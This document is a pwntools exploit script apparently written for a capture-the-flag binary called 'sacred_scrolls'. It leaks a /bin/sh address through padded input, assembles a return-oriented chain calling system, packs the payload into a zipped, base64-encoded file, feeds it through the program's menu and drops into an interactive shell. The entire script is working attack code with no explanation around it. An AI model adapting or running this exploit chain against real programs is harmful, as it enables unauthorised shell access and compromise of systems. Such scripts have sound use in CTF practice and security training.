from pwn import * 
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript="""
init-pwndbg
continue
""".format(**locals())
    
exe = './sacred_scrolls'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
rop = ROP(elf)
leak_pad = asm('nop') * 0x10
sh.sendafter(b':', leak_pad) # need sendafter, if using sendlineafter we won't leaked it full
sh.recvuntil(b'library \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90')
get = sh.recvline().strip()
# print(get)
leaked_binsh = unpack(get.ljust(8, b'\x00'))
log.success(f'leaked binsh address --> {hex(leaked_binsh)}')

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'rdi gadget --> {hex(rdi)}')

ret = rop.find_gadget(['ret'])[0]
log.success(f'stack align --> {hex(ret)}')

padding = asm('nop') * 32

p = flat([
    b'\xf0\x9f\x91\x93\xe2\x9a\xa1',
    padding,
    ret,
    rdi,
    leaked_binsh,
    elf.sym['system']
])

# print(p)
with open('spell.txt', 'wb') as f:
    f.write(p)

os.system('zip spell.zip spell.txt')
os.system('rm spell.txt')

with open('spell.zip', 'rb') as f:
    base64_payload = b64e(f.read())
    base64_bytes = base64_payload.encode() # encode to bytes 

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b':', base64_bytes)

sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'>', b'3')

sh.interactive()
